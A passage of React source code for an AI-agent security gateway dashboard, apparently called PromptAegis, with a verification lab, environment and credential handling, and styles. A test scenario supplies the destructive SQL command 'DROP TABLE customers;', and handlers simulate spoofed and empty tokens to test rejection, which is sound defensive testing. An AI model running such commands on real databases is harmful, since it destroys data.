    } else if (scenarioKey === 'sql_approval') {
      setLabAgentId(adminAgent)
      setLabToolName('execute_sql')
      setLabArgsJson(JSON.stringify({ query: 'DROP TABLE customers;' }, null, 2))
    }
  }

  const handleExecuteIntercept = async () => {
    setEvaluating(true)
    setLabError(null)
    setLabResult(null)

    let parsedArgs = {}
    try {
      parsedArgs = JSON.parse(labArgsJson)
    } catch (e) {
      setLabError(`Invalid arguments JSON: ${e.message}`)
      setEvaluating(false)
      return
    }

    try {
      const res = await api.intercept(labAgentId, labToolName, parsedArgs, labConfig, 'verification_lab')
      setLabResult(res)
      if (onRefresh) onRefresh()
    } catch (err) {
      setLabError(`Gateway intercept error: ${err.message}`)
    } finally {
      setEvaluating(false)
    }
  }

  const isConnectedApp = currentEnv === 'connected_application'

  return (
    <div style={styles.labContainer}>
      {/* Prominent Warning when connected_application */}
      {isConnectedApp && (
        <div style={{
          padding: '16px 20px',
          background: 'rgba(239, 68, 68, 0.12)',
          border: '1px solid rgba(239, 68, 68, 0.4)',
          borderRadius: 8,
          marginBottom: 16,
          display: 'flex',
          gap: 14,
          alignItems: 'flex-start',
        }}>
          <span style={{ fontSize: 24, lineHeight: 1 }}>🚫</span>
          <div>
            <div style={{ fontSize: 13, fontWeight: 700, color: 'var(--tier-high)', letterSpacing: '0.04em' }}>
              VERIFICATION LAB DISABLED IN CONNECTED APPLICATION
            </div>
            <div style={{ fontSize: 12, color: 'var(--text-muted)', marginTop: 4, lineHeight: 1.5 }}>
              The Verification Lab is a synthetic evaluation environment. Live connected applications must only receive real runtime proposals from authenticated agent integrations.
            </div>
          </div>
        </div>
      )}

      {/* Explicit Separation Banner */}
      <div style={styles.labDemarcationBanner}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
          <span style={{ fontSize: 18 }}>🔬</span>
          <div>
            <div style={styles.labDemarcationTitle}>
              CONTROLLED RESEARCH & VERIFICATION SURFACE (POST /intercept)
            </div>
            <div style={styles.labDemarcationSub}>
              Construct and evaluate controlled tool proposals through the PromptAegis reference monitor. Operator testing surface for invariant verification and reproducible evaluation.
            </div>
          </div>
        </div>
      </div>

      {/* Scenario Selector */}
      <div style={styles.scenarioBar}>
        <span style={styles.scenarioHeading}>Benchmark Threat & Verification Scenarios:</span>
        <button
          style={{ ...styles.scenarioBtn, opacity: isConnectedApp ? 0.4 : 1, cursor: isConnectedApp ? 'not-allowed' : 'pointer' }}
          onClick={() => !isConnectedApp && applyScenarioTemplate('benign')}
          disabled={isConnectedApp}
        >
          🟢 Benign Authorized Query
        </button>
        <button
          style={{ ...styles.scenarioBtn, opacity: isConnectedApp ? 0.4 : 1, cursor: isConnectedApp ? 'not-allowed' : 'pointer' }}
          onClick={() => !isConnectedApp && applyScenarioTemplate('rbac_violation')}
          disabled={isConnectedApp}
        >
          🔴 Unauthorized Tool (RBAC Breach)
        </button>
        <button
          style={{ ...styles.scenarioBtn, opacity: isConnectedApp ? 0.4 : 1, cursor: isConnectedApp ? 'not-allowed' : 'pointer' }}
          onClick={() => !isConnectedApp && applyScenarioTemplate('param_violation')}
          disabled={isConnectedApp}
        >
          🟠 Parameter Invariant Violation
        </button>
        <button
          style={{ ...styles.scenarioBtn, opacity: isConnectedApp ? 0.4 : 1, cursor: isConnectedApp ? 'not-allowed' : 'pointer' }}
          onClick={() => !isConnectedApp && applyScenarioTemplate('privilege_escalation')}
          disabled={isConnectedApp}
        >
          🔴 Privilege Escalation Attempt
        </button>
        <button
          style={{ ...styles.scenarioBtn, opacity: isConnectedApp ? 0.4 : 1, cursor: isConnectedApp ? 'not-allowed' : 'pointer' }}
          onClick={() => !isConnectedApp && applyScenarioTemplate('sql_approval')}
          disabled={isConnectedApp}
        >
          🟡 High-Risk SQL Approval Flow
        </button>
      </div>

      <div style={styles.labGrid}>
        {/* Input Constructor */}
        <div style={styles.labInputBox}>
          <div style={styles.labBoxTitle}>Structured Tool Proposal Constructor</div>
          <div style={{ fontSize: 12, color: 'var(--text-muted)', marginBottom: 14 }}>
            Simulates an LLM agent emitting a tool proposal into the PromptAegis gateway (<code>POST /intercept</code>).
          </div>

          <div style={styles.formGroup}>
            <label style={styles.formLabel}>Principal Agent Identity</label>
            <select style={styles.select} value={labAgentId} onChange={(e) => setLabAgentId(e.target.value)}>
              {agents.length === 0 ? (
                <option value="test_agent">test_agent (Unregistered fallback)</option>
              ) : (
                agents.map((a) => (
                  <option key={a.agent_id} value={a.agent_id}>
                    {a.name} ({a.role} scope)
                  </option>
                ))
              )}
            </select>
          </div>

          <div style={styles.formRow}>
            <div style={{ ...styles.formGroup, flex: 1 }}>
              <label style={styles.formLabel}>Target Capability (Tool)</label>
              <select style={styles.select} value={labToolName} onChange={(e) => setLabToolName(e.target.value)}>
                {tools.length === 0 ? (
                  <option value="search_customer">search_customer</option>
                ) : (
                  tools.map((t) => (
                    <option key={t.name} value={t.name}>
                      {t.name} ({t.category} - {t.risk_level} risk)
                    </option>
                  ))
                )}
              </select>
            </div>

            <div style={{ ...styles.formGroup, flex: 1 }}>
              <label style={styles.formLabel}>Execution Mode</label>
              <select style={styles.select} value={labConfig} onChange={(e) => setLabConfig(e.target.value)}>
                <option value="full">full (Complete Reference Monitor)</option>
                <option value="rbac_only">rbac_only (Isolate RBAC Stage)</option>
                <option value="policy_only">policy_only (Isolate Policy Stage)</option>
                <option value="baseline">baseline (Ungoverned Comparison)</option>
              </select>
            </div>
          </div>

          <div style={styles.formGroup}>
            <label style={styles.formLabel}>Structured Proposal Arguments (JSON)</label>
            <textarea
              style={styles.textareaMono}
              rows={8}
              value={labArgsJson}
              onChange={(e) => setLabArgsJson(e.target.value)}
            />
          </div>

          <button
            style={{
              ...styles.executeInterceptBtn,
              opacity: (evaluating || isConnectedApp) ? 0.4 : 1,
              cursor: (evaluating || isConnectedApp) ? 'not-allowed' : 'pointer',
            }}
            onClick={handleExecuteIntercept}
            disabled={evaluating || isConnectedApp}
          >
            {isConnectedApp
              ? 'SIMULATION DISABLED IN LIVE CONNECTED APPLICATION'
              : (evaluating ? 'Evaluating Multi-Stage Pipeline…' : '⚡ TEST THROUGH GATEWAY')}
          </button>

          {labError && <div style={styles.errorMsg}>⚠ {labError}</div>}
        </div>

        {/* Trace Visualization Result */}
        <div style={styles.labTraceBox}>
          <div style={styles.labBoxTitle}>Sequential Reference Monitor Trace</div>

          {!labResult && !evaluating && (
            <div style={styles.tracePlaceholder}>
              Select a verification scenario or construct arguments, then click <strong>TEST THROUGH GATEWAY</strong> to observe stage-by-stage enforcement.
            </div>
          )}

          {evaluating && (
            <div style={styles.tracePlaceholder}>
              <Spinner /> Intercepting proposal through PromptAegis gateway…
            </div>
          )}

          {labResult && (
            <div>
              <div style={styles.decisionBanner}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                  <DecisionBadge decision={labResult.decision} />
                  <div>
                    <div style={styles.decisionTitle}>
                      AUTHORITATIVE DECISION: <strong>{labResult.decision}</strong>
                    </div>
                    <div style={styles.decisionReasonMono}>{labResult.reason}</div>
                  </div>
                </div>
                <div style={{ textAlign: 'right' }}>
                  <div style={styles.latencyValue}>{labResult.latency_ms?.toFixed(2)} ms</div>
                  <div style={styles.callIdMono}>ID: {labResult.call_id?.slice(0, 14)}…</div>
                </div>
              </div>

              {/* 5-Stage Visual Execution Trace */}
              <div style={styles.traceStagesContainer}>
                {/* Stage 1: Rate Limiter */}
                {(() => {
                  const st = labResult.stage_evaluations?.rate_limiter
                  const isBlocking = labResult.first_blocking_stage === 'rate_limiter'
                  const isExecuted = st?.executed !== false

                  return (
                    <div style={{ ...styles.traceStageItem, borderColor: isBlocking ? 'var(--tier-high)' : isExecuted ? 'var(--signal)' : 'var(--border)' }}>
                      <div style={styles.stageTopRow}>
                        <span style={styles.stageTitle}>Stage 1: Rate Limiter (60s Fixed Window)</span>
                        <span style={isBlocking ? styles.stageStatusBlock : styles.stageStatusPass}>
                          {isBlocking ? 'BLOCK' : isExecuted ? 'PASS' : 'BYPASSED'}
                        </span>
                      </div>
                      <div style={styles.stageDetails}>
                        {st?.count !== undefined && (
                          <span>Window Call Counter: <b>{st.count} / {st.limit}</b> requests in current 60s window</span>
                        )}
                      </div>
                    </div>
                  )
                })()}

                {/* Stage 2: RBAC */}
                {(() => {
                  const st = labResult.stage_evaluations?.permission_engine
                  const isBlocking = labResult.first_blocking_stage === 'permission_engine'
                  const isExecuted = st?.executed !== false

                  return (
                    <div style={{ ...styles.traceStageItem, borderColor: isBlocking ? 'var(--tier-high)' : isExecuted ? 'var(--signal)' : 'var(--border)' }}>
                      <div style={styles.stageTopRow}>
                        <span style={styles.stageTitle}>Stage 2: RBAC Capability Gate</span>
                        <span style={isBlocking ? styles.stageStatusBlock : styles.stageStatusPass}>
                          {isBlocking ? 'BLOCK' : isExecuted ? 'PASS' : 'BYPASSED'}
                        </span>
                      </div>
                      <div style={styles.stageDetails}>
                        {st?.reason || (st?.allowed ? 'Capability permitted for principal scope' : 'Default Deny')}
                      </div>
                    </div>
                  )
                })()}

                {/* Stage 3: Parameter Policy */}
                {(() => {
                  const st = labResult.stage_evaluations?.policy_engine
                  const isBlocking = labResult.first_blocking_stage === 'policy_engine'
                  const isExecuted = st?.executed !== false

                  return (
                    <div style={{ ...styles.traceStageItem, borderColor: isBlocking ? 'var(--tier-high)' : isExecuted ? 'var(--signal)' : 'var(--border)' }}>
                      <div style={styles.stageTopRow}>
                        <span style={styles.stageTitle}>Stage 3: Parameter Invariant Policy Engine</span>
                        <span style={isBlocking ? styles.stageStatusBlock : styles.stageStatusPass}>
                          {isBlocking ? 'BLOCK' : isExecuted ? 'PASS' : 'BYPASSED'}
                        </span>
                      </div>
                      <div style={styles.stageDetails}>
                        {st?.reason || (isExecuted ? 'No invariant violations detected' : 'Bypassed')}
                        {st?.policy_id && <div style={{ marginTop: 2, color: 'var(--text-dim)' }}>Policy Rule: {st.policy_id}</div>}
                      </div>
                    </div>
                  )
                })()}

                {/* Stage 4: Risk & Approval */}
                {(() => {
                  const st = labResult.stage_evaluations?.risk_scorer
                  const isBlocking = labResult.first_blocking_stage === 'risk_scorer'
                  const isExecuted = st?.executed !== false
                  const score = labResult.risk_score ?? st?.score ?? 0

                  return (
                    <div style={{ ...styles.traceStageItem, borderColor: isBlocking ? 'var(--tier-medium)' : 'var(--border)' }}>
                      <div style={styles.stageTopRow}>
                        <span style={styles.stageTitle}>Stage 4: Risk Scorer & Approval Gate</span>
                        <span style={isBlocking ? styles.stageStatusApproval : styles.stageStatusPass}>
                          {isBlocking ? 'REQUIRE APPROVAL' : isExecuted ? 'PASS' : 'NOT EVALUATED'}
                        </span>
                      </div>
                      <div style={styles.stageDetails}>
                        Calculated Risk Score: <b>{score.toFixed(1)} / 10.0</b>
                        {st?.requires_approval && (
                          <span style={{ marginLeft: 8, color: 'var(--tier-medium)' }}>(Human approval required)</span>
                        )}
                      </div>
                    </div>
                  )
                })()}

                {/* Stage 5: Structured Audit Log */}
                <div style={{ ...styles.traceStageItem, borderColor: '#A78BFA' }}>
                  <div style={styles.stageTopRow}>
                    <span style={styles.stageTitle}>Stage 5: Structured Audit Log (Forensic Record)</span>
                    <span style={{ ...styles.stageStatusPass, color: '#A78BFA', background: 'rgba(167, 139, 250, 0.12)' }}>
                      RECORDED
                    </span>
                  </div>
                  <div style={styles.stageDetails}>
                    Structured record committed to SQLite environment audit log. Call ID: <code>{labResult.call_id}</code>
                  </div>
                </div>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}

// ─── MAIN DUAL-PLANE SECURITY CONTROL PLANE COMPONENT ───────────────────────

export default function GovernancePanel({ initialTab }) {
  const [searchParams, setSearchParams] = useSearchParams()
  const urlTab = searchParams.get('tab')
  const urlEnv = searchParams.get('env')

  // Navigation State
  const [activeTab, setActiveTab] = useState(
    urlTab || (initialTab === 'ENFORCEMENT' ? 'INVOCATIONS' : (initialTab || 'OVERVIEW'))
  )
  const [selectedPrincipal, setSelectedPrincipal] = useState(null)
  const [targetLabTool, setTargetLabTool] = useState(null)
  const [selectedTraceCall, setSelectedTraceCall] = useState(null)

  // Keep activeTab in sync with query parameter
  useEffect(() => {
    if (urlTab && urlTab !== activeTab) {
      setActiveTab(urlTab)
    }
  }, [urlTab])

  // Environment & Credential State
  const [environments, setEnvironments] = useState([])
  const [currentEnv, setCurrentEnv] = useState(() => {
    if (urlEnv && ['research_benchmark', 'local_dev', 'connected_application'].includes(urlEnv)) {
      api.setEnvironment(urlEnv)
      return urlEnv
    }
    return api.getEnvironment()
  })
  const [currentContext, setCurrentContext] = useState(null)
  const [authError, setAuthError] = useState(null)
  const [showCredModal, setShowCredModal] = useState(false)

  // Backend Domain State
  const [agents, setAgents] = useState([])
  const [tools, setTools] = useState([])
  const [policies, setPolicies] = useState([])
  const [toolCalls, setToolCalls] = useState([])
  const [stats, setStats] = useState(null)
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState(null)

  // Benchmark Seed State
  const [seeding, setSeeding] = useState(false)
  const [seedMsg, setSeedMsg] = useState(null)
  const [seedError, setSeedError] = useState(null)

  // 1. Initial Load of Environments Registry (Public)
  useEffect(() => {
    api.listEnvironments()
      .then((envs) => {
        if (Array.isArray(envs) && envs.length > 0) {
          setEnvironments(envs)
        }
      })
      .catch((e) => console.error('Failed to list environments:', e))
  }, [])

  // 2. Fetch authenticated data for the active environment
  const loadData = useCallback(async () => {
    setLoading(true)
    setError(null)
    setAuthError(null)

    try {
      // First verify credentials against the backend environment
      let ctx = null
      try {
        ctx = await api.getCurrentEnvironmentContext()
        setCurrentContext(ctx)
      } catch (authErr) {
        setAuthError(authErr)
        // CRITICAL SECURITY RULE: Do not fall back to research_benchmark! Clear state and halt.
        setAgents([])
        setTools([])
        setPolicies([])
        setToolCalls([])
        setStats(null)
        setLoading(false)
        return
      }

      // Fetch environment-scoped resources
      const [agRes, tlRes, polRes, callsRes, statsRes] = await Promise.all([
        api.listAgents().catch((e) => {
          if (e.status === 401 || e.status === 403) throw e
          return []
        }),
        api.listTools().catch((e) => {
          if (e.status === 401 || e.status === 403) throw e
          return []
        }),
        api.listPolicies().catch((e) => {
          if (e.status === 401 || e.status === 403) throw e
          return []
        }),
        api.getToolCalls(null, null, 300).catch((e) => {
          if (e.status === 401 || e.status === 403) throw e
          return []
        }),
        api.getGovernanceStats().catch((e) => {
          if (e.status === 401 || e.status === 403) throw e
          return null
        }),
      ])

      const loadedAgents = agRes?.agents ?? agRes ?? []
      setAgents(loadedAgents)
      setTools(tlRes?.tools ?? tlRes ?? [])
      setPolicies(polRes?.policies ?? polRes ?? [])
      setToolCalls(callsRes || [])
      setStats(statsRes)

      if (selectedPrincipal) {
        const up = loadedAgents.find((a) => a.agent_id === selectedPrincipal.agent_id)
        if (up) setSelectedPrincipal(up)
      }
    } catch (err) {
      if (err.status === 401 || err.status === 403) {
        setAuthError(err)
      } else {
        setError(err.message)
      }
    } finally {
      setLoading(false)
    }
  }, [selectedPrincipal])

  useEffect(() => {
    loadData()
  }, [loadData])

  // 3. Switch Environment Handler
  const handleSelectEnvironment = (newEnvId) => {
    setCurrentEnv(newEnvId)
    api.setEnvironment(newEnvId)
    setSelectedPrincipal(null)
    setSelectedTraceCall(null)
    setSeedMsg(null)
    setSeedError(null)
    setSearchParams((prev) => {
      const p = new URLSearchParams(prev)
      p.set('env', newEnvId)
      return p
    })
    // Reload state for new environment
    setTimeout(() => loadData(), 10)
  }

  // 4. Seed Benchmark Handler (Strictly Benchmark Only)
  const handleSeedBenchmark = async () => {
    setSeeding(true)
    setSeedMsg(null)
    setSeedError(null)
    try {
      const res = await api.seedDefaults()
      setSeedMsg(res.message || 'Benchmark dataset loaded successfully.')
      await loadData()
    } catch (e) {
      setSeedError(e.message)
    } finally {
      setSeeding(false)
    }
  }

  // 5. Credential Actions
  const handleApplyToken = (envId, token) => {
    api.setTokenForEnvironment(envId, token)
    loadData()
  }

  const handleSimulateUnauthenticated = () => {
    // Intentionally pass empty token to verify 401 rejection
    api.setTokenForEnvironment(currentEnv, '')
    loadData()
  }

  const handleSimulateSpoof = (targetEnv) => {
    // Test spoofing by using another environment's token while asserting targetEnv header
    const otherEnv = currentEnv === 'research_benchmark' ? 'local_dev' : 'research_benchmark'
    const otherToken = DEFAULT_ENV_TOKENS[otherEnv] || 'spoofed_mismatched_test_key'
    api.setTokenForEnvironment(currentEnv, otherToken)
    loadData()
  }

  const handleResetDefaultToken = (envId) => {
    api.resetTokenForEnvironment(envId)
    loadData()
  }

  // 6. Navigation Shortcuts
  const handleNavigateToLabWithAgent = (agent) => {
    setSelectedPrincipal(null)
    setTargetLabTool(null)
    setActiveTab('LAB')
  }

  const handleNavigateToLabWithTool = (toolName) => {
    setTargetLabTool(toolName)
    setActiveTab('LAB')
  }

  const handleInspectTraceForCall = (call) => {
    setSelectedTraceCall(call)
    setActiveTab('TRACE')
  }

  return (
    <div>
      {/* Page Header */}
      <div style={styles.pageTopRow}>
        <PageHeader
          eyebrow="APPLICATION-LEVEL AI DECISION SECURITY GATEWAY / REFERENCE MONITOR"
          title="Security Control Plane"
          subtitle="Sequential reference monitor mediating structured tool proposals before host dispatch. Governs principals, capabilities, invariants, and runtime decisions."
        />
      </div>

      {/* EXPLICIT ENVIRONMENT CONTEXT BAR (ABOVE BOTH PLANES) */}
      <EnvironmentContextBar
        environments={environments}
        currentEnv={currentEnv}
        currentContext={currentContext}
        authError={authError}
        onSelectEnv={handleSelectEnvironment}
        onManageCreds={() => setShowCredModal(true)}
        onRefresh={loadData}
        onSeedBenchmark={handleSeedBenchmark}
        seeding={seeding}
        seedMsg={seedMsg}
        seedError={seedError}
      />

      {/* Reference Monitor Pipeline Diagram */}
      <SecurityPipelineDiagram />

      {error && <div style={styles.errorMsg}>⚠ {error}</div>}

      {/* DUAL-PLANE PRIMARY NAVIGATION */}
      <div style={styles.dualPlaneNavWrap}>
        {/* Plane A: Posture & Access Boundary */}
        <div style={styles.planeSection}>
          <div style={styles.planeTitle}>PLANE A: POSTURE & ACCESS BOUNDARY</div>
          <div style={styles.navButtonGroup}>
            {PLANES.POSTURE.subtabs.map((tab) => (
              <button
                key={tab.id}
                style={{
                  ...styles.dualNavBtn,
                  ...(activeTab === tab.id ? styles.dualNavBtnActive : {}),
                }}
                onClick={() => {
                  setActiveTab(tab.id)
                  setSearchParams((prev) => {
                    const p = new URLSearchParams(prev)
                    p.set('tab', tab.id)
                    return p
                  })
                  if (tab.id === 'PRINCIPALS') setSelectedPrincipal(null)
                }}
              >
                <span style={{ marginRight: 6 }}>{tab.icon}</span>
                {tab.label}
              </button>
            ))}
          </div>
        </div>

        {/* Plane B: Runtime Gateway Enforcement */}
        <div style={styles.planeSection}>
          <div style={styles.planeTitle}>PLANE B: RUNTIME ENFORCEMENT</div>
          <div style={styles.navButtonGroup}>
            {PLANES.RUNTIME.subtabs.map((tab) => (
              <button
                key={tab.id}
                style={{
                  ...styles.dualNavBtn,
                  ...(activeTab === tab.id ? styles.dualNavBtnActiveRuntime : {}),
                }}
                onClick={() => {
                  setActiveTab(tab.id)
                  setSearchParams((prev) => {
                    const p = new URLSearchParams(prev)
                    p.set('tab', tab.id)
                    return p
                  })
                }}
              >
                <span style={{ marginRight: 6 }}>{tab.icon}</span>
                {tab.label}
              </button>
            ))}
          </div>
        </div>
      </div>

      {/* ACTIVE VIEW RENDERING */}
      <div style={{ marginTop: 20 }}>
        {/* PLANE A VIEWS */}
        {activeTab === 'OVERVIEW' && (
          <OverviewView
            stats={stats}
            agents={agents}
            tools={tools}
            policies={policies}
            toolCalls={toolCalls}
            currentEnv={currentEnv}
            currentContext={currentContext}
            onNavigate={(tab) => {
              setActiveTab(tab)
              if (tab === 'PRINCIPALS') setSelectedPrincipal(null)
            }}
          />
        )}

        {activeTab === 'PRINCIPALS' && !selectedPrincipal && (
          <PrincipalsView
            agents={agents}
            tools={tools}
            policies={policies}
            toolCalls={toolCalls}
            onSelectAgent={setSelectedPrincipal}
            onRefresh={loadData}
            loading={loading}
            currentEnv={currentEnv}
          />
        )}

        {activeTab === 'PRINCIPALS' && selectedPrincipal && (
          <PrincipalProfileView
            principal={selectedPrincipal}
            tools={tools}
            policies={policies}
            toolCalls={toolCalls}
            onBack={() => setSelectedPrincipal(null)}
            onTestInLab={handleNavigateToLabWithAgent}
            onRefresh={loadData}
          />
        )}

        {activeTab === 'CAPABILITIES' && (
          <CapabilitiesView
            tools={tools}
            onRefresh={loadData}
            onTestCapability={handleNavigateToLabWithTool}
            currentEnv={currentEnv}
          />
        )}

        {activeTab === 'INVARIANTS' && (
          <InvariantsView
            policies={policies}
            onRefresh={loadData}
            currentEnv={currentEnv}
          />
        )}

        {/* PLANE B VIEWS */}
        {activeTab === 'INVOCATIONS' && (
          <LiveInvocationsView
            toolCalls={toolCalls}
            agents={agents}
            onRefresh={loadData}
            onInspectTrace={handleInspectTraceForCall}
            currentEnv={currentEnv}
            onNavigateToLab={() => setActiveTab('LAB')}
          />
        )}

        {activeTab === 'TRACE' && (
          <DecisionTraceView
            selectedCall={selectedTraceCall}
            toolCalls={toolCalls}
            onSelectCall={setSelectedTraceCall}
            onNavigateToLab={() => setActiveTab('LAB')}
            currentEnv={currentEnv}
          />
        )}

        {activeTab === 'LAB' && (
          <VerificationLabView
            agents={agents}
            tools={tools}
            onRefresh={loadData}
            currentEnv={currentEnv}
            initialTargetPrincipal={selectedPrincipal}
            initialTargetCapability={targetLabTool}
          />
        )}
      </div>

      {/* Credential Management Modal */}
      <CredentialModal
        isOpen={showCredModal}
        onClose={() => setShowCredModal(false)}
        currentEnv={currentEnv}
        currentContext={currentContext}
        onApplyToken={handleApplyToken}
        onSimulateUnauthenticated={handleSimulateUnauthenticated}
        onSimulateSpoof={handleSimulateSpoof}
        onResetDefault={handleResetDefaultToken}
      />
    </div>
  )
}

// ─── STYLES (High Density, Restrained Severity Colors, No Toy Glitz) ─────────

const styles = {
  pageTopRow: {
    display: 'flex',
    justifyContent: 'space-between',
    alignItems: 'flex-start',
    gap: 20,
    flexWrap: 'wrap',
    marginBottom: 8,
  },
  spinner: {
    display: 'inline-block',
    animation: 'spin 1s linear infinite',
  },
  errorMsg: {
    background: 'rgba(255, 92, 92, 0.14)',
    color: 'var(--tier-high, #f87171)',
    border: '1px solid rgba(255, 92, 92, 0.35)',
    borderRadius: 'var(--radius-sm, 6px)',
    padding: '8px 12px',
    fontSize: 12.5,
    marginBottom: 16,
  },

  // Environment Context Bar
  envBarContainer: {
    background: 'var(--surface, #121821)',
    border: '1px solid var(--border, #232E3B)',
    borderRadius: 'var(--radius-md, 10px)',
    padding: '12px 16px',
    marginBottom: 16,
    display: 'flex',
    flexDirection: 'column',
    gap: 8,
  },
  envBarTop: {
    display: 'flex',
    justifyContent: 'space-between',
    alignItems: 'center',
    flexWrap: 'wrap',
    gap: 12,
  },
  envSelectorGroup: {
    display: 'flex',
    alignItems: 'center',
    gap: 10,
    flexWrap: 'wrap',
  },
  envLabelText: {
    fontFamily: 'var(--font-mono)',
    fontSize: 10.5,
    fontWeight: 700,
    color: 'var(--text-dim)',
    letterSpacing: '0.04em',
  },
  envSelect: {
    background: 'var(--surface-raised, #1A222D)',
    border: '1px solid var(--border, #232E3B)',
    color: 'var(--text-primary)',
    fontWeight: 700,
    fontSize: 12.5,
    padding: '5px 10px',
    borderRadius: 'var(--radius-sm, 6px)',
    cursor: 'pointer',
  },
  envBenchmarkTag: {
    fontFamily: 'var(--font-mono)',
    fontSize: 10,
    fontWeight: 700,
    background: 'rgba(245, 185, 66, 0.12)',
    color: '#facc15',
    border: '1px solid rgba(245, 185, 66, 0.3)',
    padding: '3px 8px',
    borderRadius: 4,
  },
  envLocalTag: {
    fontFamily: 'var(--font-mono)',
    fontSize: 10,
    fontWeight: 700,
    background: 'rgba(69, 217, 196, 0.12)',
    color: 'var(--signal, #45D9C4)',
    border: '1px solid rgba(69, 217, 196, 0.3)',
    padding: '3px 8px',
    borderRadius: 4,
  },
  envConnectedTag: {
    fontFamily: 'var(--font-mono)',
    fontSize: 10,
    fontWeight: 700,
    background: 'rgba(74, 222, 128, 0.12)',
    color: 'var(--tier-safe, #4ade80)',
    border: '1px solid rgba(74, 222, 128, 0.3)',
    padding: '3px 8px',
    borderRadius: 4,
  },
  envActionsGroup: {
    display: 'flex',
    alignItems: 'center',
    gap: 10,
    flexWrap: 'wrap',
  },
  envCredentialStatus: {
    display: 'flex',
    alignItems: 'center',
    gap: 6,
    background: 'var(--surface-raised)',
    padding: '4px 8px',
    borderRadius: 4,
    border: '1px solid var(--border)',
  },
  authDot: {
    width: 7,
    height: 7,
    borderRadius: '50%',
    background: 'var(--tier-safe)',
  },
  authRoleText: {
    fontFamily: 'var(--font-mono)',
    fontSize: 10.5,
    color: 'var(--text-muted)',
  },
  envActionBtn: {
    background: 'var(--surface-raised)',
    border: '1px solid var(--border)',
    color: 'var(--text-primary)',
    fontSize: 11.5,
    fontWeight: 600,
    padding: '5px 10px',
    borderRadius: 'var(--radius-sm)',
    cursor: 'pointer',
  },
  seedBtn: {
    background: 'rgba(245, 185, 66, 0.14)',
    border: '1px solid rgba(245, 185, 66, 0.4)',
    color: '#facc15',
    fontWeight: 700,
    fontSize: 11.5,
    padding: '5px 12px',
    borderRadius: 'var(--radius-sm)',
    cursor: 'pointer',
  },
  seedSuccessMsg: {
    fontSize: 11.5,
    color: 'var(--tier-safe)',
    background: 'rgba(74, 222, 128, 0.1)',
    padding: '4px 8px',
    borderRadius: 4,
  },
  seedErrorMsg: {
    fontSize: 11.5,
    color: 'var(--tier-high)',
    background: 'rgba(255, 92, 92, 0.1)',
    padding: '4px 8px',
    borderRadius: 4,
  },
  authErrorBanner: {
    background: 'rgba(255, 92, 92, 0.12)',
    border: '1px solid rgba(255, 92, 92, 0.35)',
    borderRadius: 'var(--radius-sm)',
    padding: '10px 14px',
    display: 'flex',
    justifyContent: 'space-between',
    alignItems: 'center',
    gap: 12,
    flexWrap: 'wrap',
  },
  authErrorTitle: {
    fontSize: 12.5,
    fontWeight: 800,
    color: 'var(--tier-high)',
    letterSpacing: '0.02em',
  },
  authErrorDetail: {
    fontSize: 11.5,
    color: 'var(--text-muted)',
    marginTop: 2,
    fontFamily: 'var(--font-mono)',
  },
  authErrorFixBtn: {
    background: 'var(--tier-high)',
    color: '#1a0505',
    border: 'none',
    fontWeight: 700,
    fontSize: 11,
    padding: '5px 12px',
    borderRadius: 4,
    cursor: 'pointer',
  },

  // Pipeline Flow Diagram
  pipelineWrap: {
    background: 'var(--surface)',
    border: '1px solid var(--border)',
    borderRadius: 'var(--radius-md)',
    padding: '14px 18px',
    marginBottom: 16,
  },
  pipelineHeader: {
    display: 'flex',
    justifyContent: 'space-between',
    alignItems: 'center',
    marginBottom: 12,
    flexWrap: 'wrap',
    gap: 8,
  },
  pipelineHeading: {
    fontSize: 12,
    fontWeight: 700,
    letterSpacing: '0.05em',
    color: 'var(--text-primary)',
    textTransform: 'uppercase',
  },
  pipelineSub: {
    fontSize: 11,
    color: 'var(--text-dim)',
  },
  pipelineSteps: {
    display: 'flex',
    alignItems: 'center',
    gap: 6,
    flexWrap: 'wrap',
  },
  pipelineStepItem: {
    display: 'flex',
    alignItems: 'center',
    gap: 6,
    flex: 1,
    minWidth: 140,
  },
  pipelineStepBox: {
    flex: 1,
    border: '1px solid var(--border)',
    borderRadius: 'var(--radius-sm)',
    padding: '8px 10px',
  },
  pipelineStepTitle: {
    fontSize: 11,
    fontWeight: 700,
  },
  pipelineStepSub: {
    fontSize: 9.5,
    color: 'var(--text-dim)',
    marginTop: 2,
  },
  pipelineArrow: {
    color: 'var(--text-dim)',
    fontSize: 13,
    userSelect: 'none',
  },

  // Dual Plane Navigation
  dualPlaneNavWrap: {
    display: 'grid',
    gridTemplateColumns: 'repeat(auto-fit, minmax(360px, 1fr))',
    gap: 12,
    marginBottom: 14,
  },
  planeSection: {
    background: 'var(--surface)',
    border: '1px solid var(--border)',
    borderRadius: 'var(--radius-md)',
    padding: '10px 14px',
  },
  planeTitle: {
    fontSize: 10,
    fontWeight: 800,
    letterSpacing: '0.06em',
    color: 'var(--text-dim)',
    marginBottom: 8,
  },
  navButtonGroup: {
    display: 'flex',
    gap: 6,
    flexWrap: 'wrap',
  },
  dualNavBtn: {
    flex: 1,
    minWidth: 100,
    background: 'var(--surface-raised)',
    border: '1px solid var(--border)',
    color: 'var(--text-muted)',
    fontSize: 11.5,
    fontWeight: 600,
    padding: '8px 10px',
    borderRadius: 'var(--radius-sm)',
    cursor: 'pointer',
    textAlign: 'center',
    transition: 'all 0.15s ease',
  },
  dualNavBtnActive: {
    background: 'var(--signal-dim)',
    border: '1px solid var(--signal)',
    color: 'var(--signal)',
    fontWeight: 700,
  },
  dualNavBtnActiveRuntime: {
    background: 'rgba(125, 211, 252, 0.15)',
    border: '1px solid #7DD3FC',
    color: '#7DD3FC',
    fontWeight: 700,
  },

  // Metrics Grid
  metricsGrid: {
    display: 'grid',
    gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))',
    gap: 12,
    marginBottom: 16,
  },
  metricCard: {
    background: 'var(--surface)',
    border: '1px solid var(--border)',
    borderRadius: 'var(--radius-md)',
    padding: '16px',
    cursor: 'pointer',
    transition: 'transform 0.1s ease, border-color 0.1s ease',
  },
  metricLabel: {
    fontSize: 10.5,
    fontWeight: 700,
    letterSpacing: '0.05em',
    color: 'var(--text-dim)',
    marginBottom: 6,
  },
  metricValueLarge: {
    fontSize: 28,
    fontWeight: 800,
    color: 'var(--text-primary)',
    fontFamily: 'var(--font-mono)',
    lineHeight: 1.1,
    marginBottom: 6,
  },
  metricDetail: {
    fontSize: 11.5,
    fontWeight: 500,
    display: 'flex',
